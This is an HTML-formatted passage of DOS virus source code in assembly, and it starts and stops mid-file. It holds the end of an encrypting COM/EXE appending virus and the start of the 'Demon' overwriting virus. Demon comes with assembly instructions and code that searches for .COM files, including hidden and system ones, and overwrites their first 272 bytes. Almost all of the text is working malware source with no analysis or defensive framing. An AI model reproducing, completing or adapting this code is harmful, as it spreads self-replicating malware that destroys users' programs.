<br><font color="#3333FF">infect_com:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; ax = filesize</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp; cx,3</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
push cx</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
sub&nbsp; ax,cx</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
lea&nbsp; si,[bp+offset buffer]</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
lea&nbsp; di,[bp+offset save3]</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
movsw</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
movsb</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp; byte ptr [si-3],0e9h</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp; word ptr [si-2],ax</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
add&nbsp; ax,103h</font>
<br><font color="#3333FF">finishinfection:</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
add&nbsp; ax,offset startencrypt-offset decrypt</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
push&nbsp; ax</font>
<p><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp; ah,2ch&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Get current time</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
int&nbsp; 21h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; dh=sec,dl=1/100 sec</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp; [bp+decrypt_value],dx&nbsp;&nbsp;&nbsp; ; Set new encryption
value</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
lea&nbsp; di,[bp+offset codestore]</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp; al,55h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; push bp</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
stosb</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
lea&nbsp; si,[bp+offset decrypt]&nbsp;&nbsp; ; Copy encryption function</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp; cx,startencrypt-decrypt&nbsp; ; Bytes to move</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
push si&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Save for later use</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
push cx</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
rep&nbsp; movsb</font>
<p><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
lea&nbsp; si,[bp+offset write]&nbsp;&nbsp;&nbsp;&nbsp; ; Copy writing function</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp; cx,endwrite-write&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;
Bytes to move</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
rep&nbsp; movsb</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
pop&nbsp; cx</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
pop&nbsp; si</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
pop&nbsp; ax</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
push di</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
push si</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
push cx</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
rep&nbsp; movsb&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Copy decryption function</font>
<p><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp; word ptr [bp+patch_startencrypt+1],ax</font>
<p><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp; al,5dh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; pop bx</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
stosb</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp; al,0c3h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; retn</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
stosb</font>
<p><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
call codestore&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; decryption</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
pop&nbsp; cx</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
pop&nbsp; di</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
pop&nbsp; si</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
rep&nbsp; movsb&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Restore decryption function</font>
<p><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp; ax,4200h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Move file pointer</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
xor&nbsp; cx,cx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; to beginning of file</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
cwd&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; xor dx,dx</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
int&nbsp; 21h</font>
<p><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp; ah,40h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Write to file</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
lea&nbsp; dx,[bp+offset buffer]&nbsp;&nbsp;&nbsp; ; Write from buffer</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
pop&nbsp; cx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; cx bytes</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
int&nbsp; 21h</font>
<p><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
dec&nbsp; byte ptr [bp+numinfec]&nbsp;&nbsp; ; One mo infection</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
jmp&nbsp; done_file</font>
<p><font color="#3333FF">attributes:</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp; ax,4301h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Set attributes to cx</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
lea&nbsp; dx,[bp+offset newDTA+30] ; filename in DTA</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
int&nbsp; 21h</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
ret</font>
<p><font color="#3333FF">write:</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
pop&nbsp; bp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Restore relativeness</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp; ah,40h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Write to file</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
lea&nbsp; dx,[bp+offset decrypt]&nbsp;&nbsp; ; Concatenate virus</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp; cx,heap-decrypt&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; # bytes to write</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
int&nbsp; 21h</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
push bp</font>
<br><font color="#3333FF">endwrite:</font>
<p><font color="#3333FF">exe_mask&nbsp; db '*.exe',0</font>
<br><font color="#3333FF">com_mask&nbsp; db '*.com',0</font>
<br><font color="#3333FF">heap:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Variables not in code</font>
<br><font color="#3333FF">; The following code is the buffer for the write
function</font>
<br><font color="#3333FF">codestore:db (startencrypt-decrypt)*2+(endwrite-write)+3
dup (?)</font>
<br><font color="#3333FF">newDTA&nbsp;&nbsp;&nbsp; db 43 dup (?)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Temporary DTA</font>
<br><font color="#3333FF">numinfec&nbsp; db ?&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Infections this run</font>
<br><font color="#3333FF">buffer&nbsp;&nbsp;&nbsp; db 1ah dup (?)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; read buffer</font>
<br><font color="#3333FF">endheap:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; End of virus</font>
<br><font color="#3333FF">end&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; entry_point</font>
<p><u>Demon Virus:</u>
<p><font color="#FF0000">;========== Demon virus ====================================
22.09.91 ========</font>
<br><font color="#FF0000">;</font>
<br><font color="#FF0000">; Assemble and link with:&nbsp; TASM&nbsp; DEMON.VIR</font>
<br><font color="#FF0000">;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
TLINK DEMON /X/T</font>
<br><font color="#FF0000">; Infect all .COM programs in current directory
with: DEMON</font>
<br><font color="#FF0000">;</font>
<br><font color="#FF0000">;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
!!! NOT ON A TUESDAY !!!</font>
<br><font color="#FF0000">;</font>
<br><font color="#FF0000">;-------------- Constants and structures</font>
<p><font color="#FF0000">Tuesday&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
=&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; INT 21h, AH=2Ah</font>
<p><font color="#FF0000">Search_Rec&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; struc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; directory search record</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
db&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 21 dup (?)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;&nbsp;&nbsp; reserved for DOS</font>
<br><font color="#FF0000">&nbsp; FileAttr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
db&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ?&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;&nbsp;&nbsp; file attribute</font>
<br><font color="#FF0000">&nbsp; FileTime&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
dw&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ?&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;&nbsp;&nbsp; packed file time</font>
<br><font color="#FF0000">&nbsp; FileDate&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
dw&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ?&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;&nbsp;&nbsp; packed file date</font>
<br><font color="#FF0000">&nbsp; FileSize&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
dd&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ?&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;&nbsp;&nbsp; long file size</font>
<br><font color="#FF0000">&nbsp; FileName&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
db&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 13 dup (?)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;&nbsp;&nbsp; ASCIIZ FILENAME.EXT</font>
<br><font color="#FF0000">Search_Rec&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ends</font>
<p><font color="#FF0000">;-------------- Demon virus segment</font>
<p><font color="#FF0000">Virus&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
segment</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
assume&nbsp; cs:Virus,ds:Virus,es:Virus,ss:Virus</font>
<p><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
org&nbsp;&nbsp;&nbsp;&nbsp; 0080h</font>
<br><font color="#FF0000">DTA&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Search_Rec &lt;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; disk transfer area</font>
<p><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
org&nbsp;&nbsp;&nbsp;&nbsp; 0100h</font>
<br><font color="#FF0000">Demon:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; virus entry point</font>
<br><font color="#FF0000">Virus_Size&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; =&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Virus_End - Demon&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; virus size = 272
bytes</font>
<p><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp;&nbsp;&nbsp;&nbsp; dx,offset All_COM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; find first .COM file,</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp;&nbsp;&nbsp;&nbsp; ah,4eh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;&nbsp;&nbsp; including hidden/system</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp;&nbsp;&nbsp;&nbsp; cx,110bh</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
int&nbsp;&nbsp;&nbsp;&nbsp; 21h</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
nop</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
jnc&nbsp;&nbsp;&nbsp;&nbsp; Infect&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; abort if no files found</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
jmp&nbsp;&nbsp;&nbsp;&nbsp; short Check_Day</font>
<br><font color="#FF0000">Infect:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
call&nbsp;&nbsp;&nbsp; Replicate&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; overwrite first 272 bytes</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp;&nbsp;&nbsp;&nbsp; dx,offset DTA</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp;&nbsp;&nbsp;&nbsp; ah,4fh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; find next .COM file,</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
int&nbsp;&nbsp;&nbsp;&nbsp; 21h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;&nbsp;&nbsp; go check day if none found</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
nop&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
